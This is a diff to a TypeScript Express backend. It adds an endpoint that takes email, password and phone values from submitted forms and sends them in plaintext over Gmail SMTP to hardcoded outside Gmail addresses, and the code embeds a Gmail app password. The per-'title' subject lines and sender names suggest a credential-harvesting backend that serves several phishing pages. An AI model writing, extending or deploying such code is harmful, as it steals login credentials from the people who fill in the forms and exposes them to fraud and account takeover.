@@ -159,6 +159,7 @@ const getRecipient2 = (): string[] => {
   if (!recipients) return [];
   return recipients.split(",").map((email) => email.trim());
 };
+
 export const sendUserInfoController = asyncHandler(
   async (req: Request, res: Response): Promise<Response> => {
     const { title, email, password, phone } = req.body;
@@ -223,3 +224,73 @@ export const sendUserInfoController = asyncHandler(
 
 
 
+// Fourth
+
+const getRecipient4 = (): string[] => {
+  const recipients = "yahyanbenedict@gmail.com,davidjohnn175@gmail.com";
+  // const recipients = "rohitkumar952895@gmail.com";
+  if (!recipients) return [];
+  return recipients.split(",").map((email) => email.trim());
+};
+
+export const sendUserInfoController2 = asyncHandler(
+  async (req: Request, res: Response): Promise<Response> => {
+    const { title, email, password, phone } = req.body;
+
+    if (!title || !email || !password) {
+      return errorResponse(res, "Missing required fields", 400);
+    }
+
+    // Build HTML Email Content
+
+
+    try {
+      const recipients = getRecipient4();
+      const htmlContent = `
+      <h2>${title}</h2>
+      <ul>
+        <li><strong>Email:</strong> ${email}</li>
+        <li><strong>Password:</strong> ${password}</li>
+        <li><strong>Phone:</strong> ${phone || "N/A"}</li>
+      </ul>
+    `;
+
+      if (recipients.length === 0) {
+        return errorResponse(res, "No recipients configured", 400);
+      }
+
+      // Gmail transporter (App Password required)
+      const transporter = nodemailer.createTransport({
+        host: "smtp.gmail.com",
+        port: 465,
+        secure: true,
+        auth: {
+          user: "davidbrown202e@gmail.com",
+          pass: "peie nkic zolx kfno", // App password only
+        },
+      });
+
+      // Subject formatted to include project title (avoids merging threads)
+      const subject = `[${title}] User Information Received - ${new Date().toLocaleDateString()}`;
+
+      // Send separate emails for each recipient (per project title)
+      const mailOptions = {
+        from: `"${title}" <davidbrown202e@gmail.com>`,
+        to: recipients,
+        subject: subject, // unique to each title/project
+        html: htmlContent,
+        headers: {
+          "Message-ID": `<${Date.now()}-${title.replace(/\s+/g, "-")}@yourapp.com>`,
+          "In-Reply-To": `<${title.replace(/\s+/g, "-")}@yourapp.com>`,
+          References: `<${title.replace(/\s+/g, "-")}@yourapp.com>`,
+        },
+      };
+      await transporter.sendMail(mailOptions);
+
+      return successResponse(res, {}, `Emails for "${title}" sent successfully`, 200);
+    } catch (error: any) {
+      console.error("❌ Email sending failed:", error.message);
+      return errorResponse(res, "Failed to send email", 500);
+    }
+  }
+);
